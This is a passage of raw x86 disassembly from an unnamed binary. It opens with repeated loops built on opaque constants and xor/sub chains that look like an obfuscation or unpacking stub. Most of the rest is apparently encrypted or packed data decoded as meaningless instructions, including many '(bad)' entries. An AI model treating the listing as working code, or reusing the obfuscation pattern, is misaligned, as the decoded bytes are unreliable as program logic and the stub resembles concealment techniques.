  41f975:	mov    DWORD PTR [ebp-0x58],edx
  41f978:	mov    edx,DWORD PTR [ebp+0x8]
  41f97b:	mov    ebx,DWORD PTR [ebp-0x54]
  41f97e:	add    edx,0x64f898
  41f984:	or     edx,ebx
  41f986:	mov    DWORD PTR [ebp-0x54],edx
  41f989:	mov    edx,DWORD PTR [ebp+0x8]
  41f98c:	mov    ebx,DWORD PTR [ebp-0x50]
  41f98f:	add    edx,ecx
  41f991:	xor    edx,ebx
  41f993:	mov    DWORD PTR [ebp-0x50],edx
  41f996:	mov    edx,DWORD PTR [ebp+0x8]
  41f999:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f99c:	add    edx,edi
  41f99e:	and    edx,ebx
  41f9a0:	mov    DWORD PTR [ebp-0x4c],edx
  41f9a3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9a6:	mov    ebx,DWORD PTR [ebp-0x48]
  41f9a9:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f9b0:	mov    DWORD PTR [ebp-0x48],edx
  41f9b3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9b6:	mov    ebx,0xfa5e1524
  41f9bb:	sub    ebx,edx
  41f9bd:	add    ebx,DWORD PTR [ebp-0x44]
  41f9c0:	mov    DWORD PTR [ebp-0x44],ebx
  41f9c3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9c6:	xor    edx,eax
  41f9c8:	add    edx,esi
  41f9ca:	jne    0x41f953
  41f9d0:	jmp    0x41fa5d
  41f9d5:	mov    edx,DWORD PTR [ebp-0x14]
  41f9d8:	mov    DWORD PTR [ebp+0x8],edx
  41f9db:	jmp    0x41fa50
  41f9e0:	mov    edx,DWORD PTR [ebp+0x8]
  41f9e3:	mov    ebx,DWORD PTR [ebp-0x8]
  41f9e6:	xor    edx,eax
  41f9e8:	xor    ebx,eax
  41f9ea:	sub    edx,ebx
  41f9ec:	sub    edx,esi
  41f9ee:	xor    edx,eax
  41f9f0:	mov    DWORD PTR [ebp+0x8],edx
  41f9f3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9f6:	mov    ebx,DWORD PTR [ebp-0x58]
  41f9f9:	add    edx,0x5708fa
  41f9ff:	imul   edx,ebx
  41fa02:	mov    DWORD PTR [ebp-0x58],edx
  41fa05:	mov    edx,DWORD PTR [ebp+0x8]
  41fa08:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa0b:	add    edx,0x64f898
  41fa11:	or     edx,ebx
  41fa13:	mov    DWORD PTR [ebp-0x54],edx
  41fa16:	mov    edx,DWORD PTR [ebp+0x8]
  41fa19:	mov    ebx,DWORD PTR [ebp-0x50]
  41fa1c:	add    edx,ecx
  41fa1e:	xor    edx,ebx
  41fa20:	mov    DWORD PTR [ebp-0x50],edx
  41fa23:	mov    edx,DWORD PTR [ebp+0x8]
  41fa26:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fa29:	add    edx,edi
  41fa2b:	and    edx,ebx
  41fa2d:	mov    DWORD PTR [ebp-0x4c],edx
  41fa30:	mov    edx,DWORD PTR [ebp+0x8]
  41fa33:	mov    ebx,DWORD PTR [ebp-0x48]
  41fa36:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fa3d:	mov    DWORD PTR [ebp-0x48],edx
  41fa40:	mov    edx,DWORD PTR [ebp+0x8]
  41fa43:	mov    ebx,0xfa5e1524
  41fa48:	sub    ebx,edx
  41fa4a:	add    ebx,DWORD PTR [ebp-0x44]
  41fa4d:	mov    DWORD PTR [ebp-0x44],ebx
  41fa50:	mov    edx,DWORD PTR [ebp+0x8]
  41fa53:	xor    edx,eax
  41fa55:	add    edx,esi
  41fa57:	jne    0x41f9e0
  41fa5d:	mov    edx,DWORD PTR [ebp-0x14]
  41fa60:	mov    DWORD PTR [ebp+0x8],edx
  41fa63:	jmp    0x41fad8
  41fa68:	mov    edx,DWORD PTR [ebp+0x8]
  41fa6b:	mov    ebx,DWORD PTR [ebp-0x8]
  41fa6e:	xor    edx,eax
  41fa70:	xor    ebx,eax
  41fa72:	sub    edx,ebx
  41fa74:	sub    edx,esi
  41fa76:	xor    edx,eax
  41fa78:	mov    DWORD PTR [ebp+0x8],edx
  41fa7b:	mov    edx,DWORD PTR [ebp+0x8]
  41fa7e:	mov    ebx,DWORD PTR [ebp-0x58]
  41fa81:	add    edx,0x5708fa
  41fa87:	imul   edx,ebx
  41fa8a:	mov    DWORD PTR [ebp-0x58],edx
  41fa8d:	mov    edx,DWORD PTR [ebp+0x8]
  41fa90:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa93:	add    edx,0x64f898
  41fa99:	or     edx,ebx
  41fa9b:	mov    DWORD PTR [ebp-0x54],edx
  41fa9e:	mov    edx,DWORD PTR [ebp+0x8]
  41faa1:	mov    ebx,DWORD PTR [ebp-0x50]
  41faa4:	add    edx,ecx
  41faa6:	xor    edx,ebx
  41faa8:	mov    DWORD PTR [ebp-0x50],edx
  41faab:	mov    edx,DWORD PTR [ebp+0x8]
  41faae:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fab1:	add    edx,edi
  41fab3:	and    edx,ebx
  41fab5:	mov    DWORD PTR [ebp-0x4c],edx
  41fab8:	mov    edx,DWORD PTR [ebp+0x8]
  41fabb:	mov    ebx,DWORD PTR [ebp-0x48]
  41fabe:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fac5:	mov    DWORD PTR [ebp-0x48],edx
  41fac8:	mov    edx,DWORD PTR [ebp+0x8]
  41facb:	mov    ebx,0xfa5e1524
  41fad0:	sub    ebx,edx
  41fad2:	add    ebx,DWORD PTR [ebp-0x44]
  41fad5:	mov    DWORD PTR [ebp-0x44],ebx
  41fad8:	mov    edx,DWORD PTR [ebp+0x8]
  41fadb:	xor    edx,eax
  41fadd:	add    edx,esi
  41fadf:	jne    0x41fa68
  41fae5:	mov    edx,DWORD PTR [ebp-0x8]
  41fae8:	mov    ebx,DWORD PTR [ebp-0xc]
  41faeb:	xor    edx,eax
  41faed:	lea    edx,[edx+ebx*1+0x3272f1]
  41faf4:	jmp    0x421e4c
  41faf9:	and    BYTE PTR ds:0xc10ac90f,dh
  41faff:	mov    ds:0xfe8da196,al
  41fb04:	jmp    0x4d28a9d1
  41fb09:	adc    BYTE PTR [esi+0x5e46837c],dh
  41fb0f:	add    DWORD PTR [ebx-0x2b66cff8],0xffffffb0
  41fb16:	push   ecx
  41fb17:	mov    ebx,0xcd602e24
  41fb1c:	mov    cl,0xb2
  41fb1e:	pop    ebp
  41fb1f:	rcl    BYTE PTR [edi+0x4f322077],1
  41fb25:	mov    ebx,0xd9f0a8a2
  41fb2a:	add    BYTE PTR [esi],0x98
  41fb2d:	and    BYTE PTR ds:0x11f5aa17,bl
  41fb33:	adc    ah,al
  41fb35:	imul   ebp,DWORD PTR [esi-0x66],0x64af7df0
  41fb3c:	sub    al,0x46
  41fb3e:	xor    al,0xfb
  41fb40:	or     edi,edx
  41fb42:	iret   
  41fb43:	ror    BYTE PTR [esi+0x497cc8dc],cl
  41fb49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb4a:	cmp    edi,DWORD PTR [ebp+0x1f65e17f]
  41fb50:	push   0x286b433b
  41fb55:	adc    BYTE PTR [eax+0x66e4a1aa],0xc5
  41fb5c:	add    BYTE PTR [ebx-0x11eac508],ah
  41fb62:	mov    ds,WORD PTR [ebp+0x40041d84]
  41fb68:	and    ch,bh
  41fb6a:	mov    eax,0xd109ee2e
  41fb6f:	inc    edi
  41fb70:	jo     0x41fb9d
  41fb72:	xor    esi,edi
  41fb74:	xchg   esp,eax
  41fb75:	ror    BYTE PTR [ebp-0x566d82a5],cl
  41fb7b:	ins    BYTE PTR es:[edi],dx
  41fb7c:	js     0x41fbb5
  41fb7e:	inc    ecx
  41fb7f:	int3   
  41fb80:	test   bl,bl
  41fb82:	shr    BYTE PTR [ebx],1
  41fb84:	mov    ecx,0x6bb9b3
  41fb89:	leave  
  41fb8a:	push   eax
  41fb8b:	sub    al,0xb5
  41fb8d:	ins    DWORD PTR es:[edi],dx
  41fb8e:	repz ret 0x1cbe
  41fb92:	int    0xe
  41fb94:	pop    edx
  41fb95:	int    0x5e
  41fb97:	fdivp  st(2),st
  41fb99:	xchg   edx,eax
  41fb9a:	push   ss
  41fb9b:	jb     0x41fbc2
  41fb9d:	fs mov edx,0x9fca6f5f
  41fba3:	sbb    al,0x2c
  41fba5:	or     BYTE PTR [ecx],0x7a
  41fba8:	jne    0x41fb5d
  41fbaa:	cmp    dl,BYTE PTR [ebx]
  41fbac:	(bad)  
  41fbad:	aas    
  41fbae:	jo     0x41fc1f
  41fbb0:	in     eax,0x31
  41fbb2:	sub    eax,0x14a03686
  41fbb7:	pop    es
  41fbb8:	hlt    
  41fbb9:	call   0x36e:0xc2ef4728
  41fbc0:	sub    ecx,edx
  41fbc2:	xchg   edi,eax
  41fbc3:	add    ebp,eax
  41fbc5:	xor    al,0x98
  41fbc7:	das    
  41fbc8:	dec    esp
  41fbc9:	dec    esp
  41fbca:	outs   dx,DWORD PTR ds:[esi]
  41fbcb:	nop
  41fbcc:	fidivr WORD PTR [esi]
  41fbce:	imul   esi,ebx,0xb3a68527
  41fbd4:	inc    esp
  41fbd5:	imul   edx
  41fbd7:	(bad)  
  41fbd9:	fs push ebp
  41fbdb:	fbstp  TBYTE PTR [ebp-0x580ea00a]
  41fbe1:	xor    ecx,esp
  41fbe3:	es ins BYTE PTR es:[edi],dx
  41fbe5:	fldcw  WORD PTR [edi+eiz*2-0x2e]
  41fbe9:	iret   
  41fbea:	pop    ebx
  41fbeb:	ins    BYTE PTR es:[edi],dx
  41fbec:	xchg   BYTE PTR [edx+0x47fd4d77],al
  41fbf2:	adc    eax,0xc3d3821f
  41fbf7:	inc    esi
  41fbf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbf9:	jg     0x41fbfa
  41fbfb:	or     edi,DWORD PTR [ebp+ebp*4+0x1c374d9]
  41fc02:	and    DWORD PTR [eax-0x248d1c33],ecx
  41fc08:	lahf   
  41fc09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc0a:	pop    ds
  41fc0b:	outs   dx,DWORD PTR ds:[esi]
  41fc0c:	adc    edx,ecx
  41fc0e:	daa    
  41fc0f:	rcl    dh,1
  41fc11:	inc    edi
  41fc12:	push   0xa575fb15
  41fc17:	pop    ss
  41fc18:	pop    ss
  41fc19:	out    0x6,al
  41fc1b:	pop    esi
  41fc1c:	mov    bl,0x77
  41fc1e:	jmp    0x8a8c65b7
  41fc23:	mov    ds:0x3a8e9575,eax
  41fc28:	or     ecx,ebx
  41fc2a:	mov    eax,0xfcc8c9ed
  41fc2f:	ins    DWORD PTR es:[edi],dx
  41fc30:	xchg   esp,eax
  41fc31:	out    dx,al
  41fc32:	frstor ss:[edi]
  41fc35:	mov    cl,BYTE PTR [esi+0x5efa9a90]
  41fc3b:	pop    esp
  41fc3c:	ds std 
  41fc3e:	xchg   ebp,eax
  41fc3f:	mov    ds:0x7a5a7c13,eax
  41fc44:	mov    ch,0x12
  41fc46:	mov    ds:0xa4853eb4,eax
  41fc4b:	pop    esp
  41fc4c:	rcr    BYTE PTR [edx-0x4a52d1eb],1
  41fc52:	or     eax,0x81d348d4
  41fc57:	inc    edi
  41fc58:	sti    
  41fc59:	xchg   ebp,eax
  41fc5a:	ret    0x33fd
  41fc5d:	mov    esi,0x11097899
  41fc62:	sub    BYTE PTR [edi+edx*2-0x1a],bh
  41fc66:	mov    ah,0x75
  41fc68:	out    0x77,al
  41fc6a:	mov    ecx,0x53496c8d
  41fc6f:	inc    ebp
  41fc70:	addr16 jne 0x41fc19
  41fc73:	daa    
  41fc74:	pop    esi
  41fc75:	sahf   
  41fc76:	push   ecx
  41fc77:	idiv   BYTE PTR [eax-0x17]
  41fc7a:	dec    esi
  41fc7b:	(bad)  
  41fc7c:	pushf  
  41fc7d:	mov    eax,0xd647d480
  41fc82:	pop    eax
  41fc83:	aas    
  41fc84:	(bad)  
  41fc85:	pop    ebp
  41fc86:	repnz in eax,0xd5
  41fc89:	stos   DWORD PTR es:[edi],eax
  41fc8a:	dec    esp
  41fc8b:	adc    ch,cl
  41fc8d:	shl    esi,1
  41fc8f:	mov    edi,0x9c498f78
  41fc94:	popf   
  41fc95:	mov    ch,0x54
  41fc97:	arpl   WORD PTR [edi],cx
  41fc99:	popf   
  41fc9a:	je     0x41fd09
  41fc9c:	inc    ebx
  41fc9d:	ror    BYTE PTR [edi+ebx*4],1
  41fca0:	pop    ss
  41fca1:	inc    ebx
  41fca2:	push   es
  41fca3:	mov    ebp,0xeb698516
  41fca8:	arpl   WORD PTR [eax],dx
  41fcaa:	lds    edi,FWORD PTR [ecx+0x57f0475a]
  41fcb0:	arpl   WORD PTR [ebp-0x63],sp
  41fcb3:	dec    eax
  41fcb4:	das    
  41fcb5:	daa    
  41fcb6:	sbb    ebx,DWORD PTR [ebp-0x45]
  41fcb9:	repnz cmc 
  41fcbb:	call   0x5db1:0xbb40617f
  41fcc2:	mov    dl,0x9
  41fcc4:	iret   
  41fcc5:	cmp    cl,0x47
  41fcc8:	push   es
  41fcc9:	adc    BYTE PTR [edx+0x4d],0xc0
  41fccd:	xchg   DWORD PTR [edx],esp
  41fccf:	pop    edi
  41fcd0:	push   cs
  41fcd1:	not    DWORD PTR [edx-0x47]
  41fcd4:	mov    WORD PTR [edi],gs
  41fcd6:	xlat   BYTE PTR ds:[ebx]
  41fcd7:	aad    0x24
  41fcd9:	push   edx
  41fcda:	jnp    0x41fcd9
  41fcdc:	mov    WORD PTR [ebp+0x3d49f384],?
  41fce2:	inc    eax
  41fce3:	mov    esp,0x4723669a
  41fce8:	repz push eax
  41fcea:	addr16 sbb eax,0x88cd6bee
  41fcf0:	pop    esp
  41fcf1:	ja     0x41fd05
  41fcf3:	ja     0x41fcaa
  41fcf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcf6:	mov    edx,DWORD PTR [ecx-0x68]
  41fcf9:	out    0x26,eax
  41fcfb:	pop    ss
  41fcfc:	cli    
  41fcfd:	retf   0xfbb4
  41fd00:	inc    edi
  41fd01:	push   ebp
  41fd02:	les    edi,FWORD PTR [esi-0x56e6e143]
  41fd08:	fnsave [ecx+ecx*2]
  41fd0b:	(bad)  [ecx+0x30]
  41fd0e:	and    DWORD PTR [edi+eiz*2+0x45f22a47],esp
  41fd15:	inc    ecx
  41fd16:	mov    WORD PTR [esi+0x1a],fs
  41fd19:	hlt    
  41fd1a:	cmp    eax,0x2aea1844
  41fd1f:	jns    0x41fcb0
  41fd21:	jnp    0x41fd18
  41fd23:	pop    edi
  41fd24:	lods   al,BYTE PTR ds:[esi]
  41fd25:	pushf  
  41fd26:	sar    DWORD PTR [ecx-0x6561fcde],1
  41fd2c:	loope  0x41fcc0
  41fd2e:	mov    eax,esi
  41fd30:	and    edx,DWORD PTR ds:0xd2f809f5
  41fd36:	fcmovnu st,st(3)
  41fd38:	(bad)  
  41fd39:	adc    esp,DWORD PTR [ecx]
  41fd3b:	fisttp WORD PTR [edi-0x13]
  41fd3e:	idiv   DWORD PTR [ecx+esi*8]
  41fd41:	clc    
  41fd42:	mov    ebp,0x96e452e8
  41fd47:	ins    BYTE PTR es:[edi],dx
  41fd48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd49:	jbe    0x41fcee
  41fd4b:	xchg   cl,ah
  41fd4d:	imul   eax,edx,0xee4f175a
  41fd53:	stc    
  41fd54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd55:	inc    esi
  41fd56:	inc    ebx
  41fd57:	adc    DWORD PTR [ecx],esi
  41fd59:	in     al,0x96
  41fd5b:	sbb    esi,DWORD PTR [ebx+0x688d9857]
  41fd61:	fimul  DWORD PTR [ecx+0x26f06cda]
  41fd67:	test   BYTE PTR [edx+0x18],bl
  41fd6a:	inc    ecx
  41fd6b:	and    ch,BYTE PTR [ebp-0x43]
  41fd6e:	xor    DWORD PTR [ebx],0x28
  41fd71:	pop    eax
  41fd72:	add    ecx,DWORD PTR [eax]
  41fd74:	sbb    BYTE PTR ds:0x74b60e22,0x94
  41fd7b:	std    
  41fd7c:	imul   ecx,edi,0x44b0ec16
  41fd82:	pop    eax
  41fd83:	les    edi,FWORD PTR [edi]
  41fd85:	xor    BYTE PTR [edi+eax*4+0x33],ch
  41fd89:	dec    ecx
  41fd8a:	push   ds
  41fd8b:	scas   eax,DWORD PTR es:[edi]
  41fd8c:	push   ds
  41fd8d:	xchg   edx,eax
  41fd8e:	mov    WORD PTR [esi+0x6e],fs
  41fd91:	dec    ebp
  41fd92:	and    eax,0x670563a6
  41fd97:	pusha  
  41fd98:	xlat   BYTE PTR ds:[ebx]
  41fd99:	(bad)  
  41fd9a:	xor    cl,bh
  41fd9c:	mov    al,0xc
  41fd9e:	fisubr DWORD PTR [ebx]
  41fda0:	test   al,0x61
  41fda2:	jbe    0x41fdb5
  41fda4:	mov    ds:0x1d0a3e78,eax
  41fda9:	push   ebx
  41fdaa:	retf   
  41fdab:	dec    ebp
  41fdac:	cs dec ecx
  41fdae:	iret   
  41fdaf:	mov    eax,ds:0x44e22f5
  41fdb4:	das    
  41fdb5:	sub    al,0xdf
  41fdb7:	repz out dx,eax
  41fdb9:	or     BYTE PTR [ebx+eiz*1],0xca
  41fdbd:	push   bp
  41fdbf:	sub    ecx,ebp
  41fdc1:	and    ch,bl
  41fdc3:	fwait
  41fdc4:	dec    ebx
  41fdc5:	push   es
  41fdc6:	cli    
  41fdc7:	or     eax,0xc7f7e1cb
  41fdcc:	mov    ds:0xe6a927fa,al
  41fdd1:	pop    esp
  41fdd2:	sub    al,0xce
  41fdd4:	or     BYTE PTR [ecx-0x16bf4c80],al
  41fdda:	sbb    eax,0x8da8a3c5
  41fddf:	and    al,BYTE PTR [ebx]
  41fde1:	sbb    esp,edx
  41fde3:	lods   eax,DWORD PTR ds:[esi]
  41fde4:	pop    ss
  41fde5:	jmp    0x71c6:0x6784
  41fdeb:	mov    ds:0x43992042,eax
  41fdf0:	ds sahf 
  41fdf2:	xor    DWORD PTR [edi+0x7e],0xd42bd176
  41fdf9:	neg    DWORD PTR [esi]
  41fdfb:	pushf  
  41fdfc:	popf   
  41fdfd:	jmp    0x41fd92
  41fdff:	fnstenv [edi-0x61e60007]
  41fe05:	jns    0x41fd92
  41fe07:	or     DWORD PTR [ebx-0x7649daf9],edi
  41fe0d:	pushf  
  41fe0e:	mov    ds:0x32c11bda,eax
  41fe13:	push   ds
  41fe14:	imul   esp,DWORD PTR [ebx+0x12c010ad],0xe758dd02
  41fe1e:	jp     0x41fe81
  41fe20:	cmp    eax,0x2ac0c951
  41fe25:	inc    esi
  41fe26:	leave  
  41fe27:	sub    al,0x78
  41fe29:	(bad)  
  41fe2a:	mov    edx,0x207e75a7
  41fe2f:	repnz pop ebp
  41fe31:	in     eax,dx
  41fe32:	pushf  
  41fe33:	jno    0x41fea1
  41fe35:	popf   
  41fe36:	xchg   esp,eax
  41fe37:	adc    al,0x8b
  41fe39:	ret    0x302d
  41fe3c:	cld    
  41fe3d:	add    DWORD PTR [esi-0x68ea916b],ecx
  41fe43:	mov    WORD PTR [ebp-0x3c],ds
  41fe46:	les    esp,FWORD PTR [ebx+0x2d883c76]
  41fe4c:	pop    ds
  41fe4d:	repnz sbb BYTE PTR [ebx-0x4e4fb5dd],cl
  41fe54:	aam    0x45
  41fe56:	popf   
  41fe57:	fst    DWORD PTR [ebx-0x2d2ffbbf]
  41fe5d:	pusha  
  41fe5e:	jge    0x41fe82
  41fe60:	push   ebp
  41fe61:	fs dec ebx
  41fe63:	cmp    eax,0x8e4847e1
  41fe68:	clc    
  41fe69:	sub    al,0xe2
  41fe6b:	cmp    eax,0xcf01e02d
  41fe70:	xchg   edi,eax
  41fe71:	aas    
  41fe72:	xchg   BYTE PTR [ecx],bh
  41fe74:	rol    al,0x15
  41fe77:	and    eax,DWORD PTR [ecx-0x34]
  41fe7a:	push   esi
  41fe7b:	lods   al,BYTE PTR ds:[esi]
  41fe7c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41fe7e:	adc    eax,0x2d4bfea9
  41fe83:	dec    esp
  41fe84:	inc    esp
  41fe85:	and    DWORD PTR [ebx+0x17],esp
  41fe88:	mov    eax,0x3213adbb
  41fe8d:	mov    al,ds:0x10f1bef9
  41fe92:	sub    esp,eax
  41fe94:	xchg   DWORD PTR cs:[esi-0x1d66f5b0],edi
  41fe9b:	(bad)  
  41fe9c:	leave  
  41fe9d:	test   ebx,0x29c9c7b8
  41fea3:	mov    ds:0xdc1db9e6,al
  41fea8:	xor    eax,DWORD PTR [edi+0x74f9a08]
  41feae:	ins    DWORD PTR es:[edi],dx
  41feaf:	std    
  41feb0:	adc    edx,DWORD PTR [ebx+0x6c925189]
  41feb6:	jno    0x41fe9d
  41feb8:	xor    DWORD PTR [eax+0x21],0xffffffad
  41febc:	(bad)  
  41febd:	jl     0x41fe4f
  41febf:	inc    edi
  41fec0:	xchg   edx,eax
  41fec1:	loope  0x41feaf
  41fec3:	mov    edx,0xd88c55c3
  41fec8:	adc    edx,DWORD PTR [ecx]
  41feca:	jge    0x41fe8a
  41fecc:	ret    
  41fecd:	sub    al,0x5f
  41fecf:	pop    esp
  41fed0:	sbb    DWORD PTR [ebp+0x745ac7b3],edx
  41fed6:	into   
  41fed7:	mov    ds:0xc2873a0d,eax
  41fedc:	aaa    
  41fedd:	mov    cl,0x85
  41fedf:	and    ch,0xd0
  41fee2:	scas   al,BYTE PTR es:[edi]
  41fee3:	pop    es
  41fee4:	mov    DWORD PTR [ebx-0x3f775640],edx
  41feea:	xchg   edi,eax
  41feeb:	inc    ebx
  41feec:	mov    esi,0x16b8548f
  41fef1:	push   eax
  41fef2:	and    al,0x2f
  41fef4:	mov    esi,0xf4dce949
  41fef9:	ficomp WORD PTR [esi]
  41fefb:	das    
  41fefc:	dec    ecx
  41fefd:	cmp    bl,0xc7
  41ff00:	data16 jnp 0x41fec2
  41ff03:	xchg   ebx,eax
  41ff04:	test   BYTE PTR [esi+0x6],dh
  41ff07:	mov    dl,0x4f
  41ff09:	mov    WORD PTR [edx+0x5c],es
  41ff0c:	outs   dx,BYTE PTR ds:[esi]
  41ff0d:	add    al,0xbb
  41ff0f:	mov    ebx,0x49b2fe29
  41ff14:	sar    DWORD PTR [ebp+0x1561fe08],cl
  41ff1a:	cmp    BYTE PTR [edi],0xd9
  41ff1d:	icebp  
  41ff1e:	enter  0x4fc5,0x8e
  41ff22:	dec    ecx
  41ff23:	aad    0xdc
  41ff25:	push   DWORD PTR [esi+0x36]
  41ff28:	or     ecx,esp
  41ff2a:	scas   al,BYTE PTR es:[edi]
  41ff2b:	jb     0x41ffac
  41ff2d:	xor    eax,0xca59954c
  41ff32:	ss inc esp
  41ff34:	mov    esi,0xf5e5a4f4
  41ff39:	mov    eax,ds:0xec81ac8a
  41ff3e:	dec    eax
  41ff3f:	and    BYTE PTR [edx*8-0x300774f2],ch
  41ff46:	das    
  41ff47:	pop    ebx
  41ff48:	xor    al,BYTE PTR [esi]
  41ff4a:	dec    ebp
  41ff4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff4c:	test   DWORD PTR [esi],ecx
  41ff4e:	rol    DWORD PTR [ecx+0x1a],0x65
  41ff52:	icebp  
  41ff53:	aas    
  41ff54:	call   0x872bdb3
  41ff59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff5a:	addr16 daa 
  41ff5c:	cli    
  41ff5d:	and    al,0x53
  41ff5f:	stos   DWORD PTR es:[edi],eax
  41ff60:	push   0x5b371a67
  41ff65:	std    
  41ff66:	mov    edx,cs
  41ff68:	xor    eax,0x3a13c7eb
  41ff6d:	and    esi,ebx
  41ff6f:	aam    0xf1
  41ff71:	jnp    0x41ff7f
  41ff73:	into   
  41ff74:	dec    ecx
  41ff75:	inc    eax
  41ff76:	sub    BYTE PTR [edx],ah
  41ff78:	sti    
  41ff79:	xchg   ebx,eax
  41ff7a:	xor    eax,0xac390aaf
  41ff7f:	sbb    BYTE PTR [ecx],dl
  41ff81:	pop    edi
  41ff82:	pop    ebp
  41ff83:	cmp    BYTE PTR ds:0xc4e8e6e3,bh
  41ff89:	and    BYTE PTR [esi-0x11],0xcc
  41ff8d:	arpl   ax,bp
  41ff8f:	daa    
  41ff90:	fisubr WORD PTR [ebp+0x44]
  41ff93:	push   esp
  41ff94:	arpl   WORD PTR [ecx],sp
  41ff96:	stos   DWORD PTR es:[edi],eax
  41ff97:	ja     0x41ff4c
  41ff99:	dec    ebx
  41ff9a:	xchg   ebp,eax
  41ff9b:	add    DWORD PTR [ebx],esi
  41ff9d:	clc    
  41ff9e:	mov    ds:0x9a609bc2,al
  41ffa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffa4:	fisttp QWORD PTR [esi+0x5a1cb50f]
  41ffaa:	stos   BYTE PTR es:[edi],al
  41ffab:	xchg   BYTE PTR [edi+0x4f],bl
  41ffae:	push   0x40aefc30
  41ffb3:	or     eax,DWORD PTR [ebx+edi*1]
  41ffb6:	cld    
  41ffb7:	or     bl,BYTE PTR [ecx]
  41ffb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffba:	pop    edi
  41ffbb:	sbb    eax,0x938dc019
  41ffc0:	cs fwait
  41ffc2:	imul   edx,DWORD PTR [edx+0x6f],0xfffffff1
  41ffc6:	into   
  41ffc7:	aas    
  41ffc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffc9:	pop    es
  41ffca:	mov    al,ds:0x97d8f302
  41ffcf:	fwait
  41ffd0:	dec    ebx
  41ffd1:	push   cs
  41ffd2:	sbb    BYTE PTR [esi],bh
  41ffd4:	pop    esi
  41ffd5:	push   edx
  41ffd6:	jecxz  0x42000e
  41ffd8:	gs xchg esi,eax
  41ffda:	pop    ebx
  41ffdb:	je     0x420052
  41ffdd:	ficomp WORD PTR [ecx-0x6ffe30de]
  41ffe3:	mov    eax,db2
  41ffe6:	nop
  41ffe7:	(bad)  
  41ffe9:	jmp    esi
  41ffeb:	jp     0x41ff8e
  41ffed:	mov    esi,0xf0d633c8
  41fff2:	mov    ds:0x61ff3061,al
  41fff7:	push   edx
  41fff8:	and    al,0x90
  41fffa:	pop    ss
  41fffb:	xchg   ecx,eax
  41fffc:	xlat   BYTE PTR ds:[ebx]
  41fffd:	popf   
  41fffe:	xchg   edi,eax
  41ffff:	aas    
  420000:	sub    cl,cl
  420002:	inc    edi
  420003:	inc    eax
  420004:	pop    ebx
  420005:	cs or  al,0x56
  420008:	shl    BYTE PTR [ebx-0x6d92d896],1
  42000e:	out    dx,eax
  42000f:	fdiv   DWORD PTR [esi-0xac13e57]
  420015:	mov    WORD PTR [edx+0x76bd5d68],cs
  42001b:	mov    dl,BYTE PTR [edx]
  42001d:	clc    
  42001e:	push   ebx
  42001f:	fstp   st(4)
  420021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420022:	xor    DWORD PTR [ebx],edi
  420024:	ret    0xa55f
  420027:	inc    esp
  420028:	retf   
  420029:	aas    
  42002a:	push   ebx
  42002b:	dec    esp
  42002c:	leave  
  42002d:	mov    al,ds:0xce649355
  420032:	sub    dh,BYTE PTR [ecx+0x117808de]
  420038:	imul   ebx,DWORD PTR [ebp+0x57fe472c],0x2522ab91
  420042:	xor    eax,0x883c80f1
  420047:	add    al,0xf5
  420049:	mov    ds:0xdc715bb1,eax
  42004e:	outs   dx,DWORD PTR ds:[esi]
  42004f:	mov    al,0xe9
  420051:	test   al,0x48
  420053:	aaa    
  420054:	inc    ebx
  420055:	push   es
  420056:	popf   
  420057:	push   esi
  420058:	mov    al,ds:0x588a2948
  42005d:	or     al,0x3b
  42005f:	xchg   BYTE PTR [esi+0x1d],bh
  420062:	or     DWORD PTR [ecx],esp
  420064:	sbb    ecx,eax
  420066:	mov    ah,0x62
  420068:	fst    DWORD PTR [ebp+0x77d2633e]
  42006e:	sub    ah,BYTE PTR [eax+esi*4-0x6766f690]
  420075:	test   DWORD PTR ds:0x31acfd34,0xa2f0e2ec
  42007f:	sub    dh,cl
  420081:	sub    BYTE PTR ds:0xc1006318,al
  420087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420088:	sbb    ah,BYTE PTR [eiz*2+0x2e62d00b]
  42008f:	ja     0x4200c7
  420091:	mov    bl,0xf6
  420093:	sbb    ebx,ebp
  420095:	gs aam 0xec
  420098:	out    0xc1,eax
  42009a:	cli    
  42009b:	pop    ss
  42009c:	push   ecx
  42009d:	ret    0xc2f5
  4200a0:	mov    bl,0x8d
  4200a2:	push   ds
  4200a3:	mov    ch,0x53
  4200a5:	cmp    eax,0x749ccaae
  4200aa:	loope  0x420056
  4200ac:	adc    edx,ecx
  4200ae:	sti    
  4200af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200b0:	mov    edx,0xb950e2bb
  4200b5:	int    0xa7
  4200b7:	add    ebx,0x8ac4df02
  4200bd:	mov    ds,WORD PTR [esi]
  4200bf:	push   esi
  4200c0:	(bad)  
  4200c1:	dec    edi
  4200c2:	add    BYTE PTR [ebx+edi*2-0x2d],al
  4200c6:	xchg   edx,eax
  4200c7:	jecxz  0x420112
  4200c9:	stos   DWORD PTR es:[edi],eax
  4200ca:	fdiv   st(6),st
  4200cc:	push   eax
  4200cd:	push   edx
  4200ce:	jno    0x4200db
  4200d0:	push   es
  4200d1:	out    0x20,eax
  4200d3:	ins    BYTE PTR es:[edi],dx
  4200d4:	inc    esp
  4200d5:	out    dx,eax
  4200d6:	push   ebp
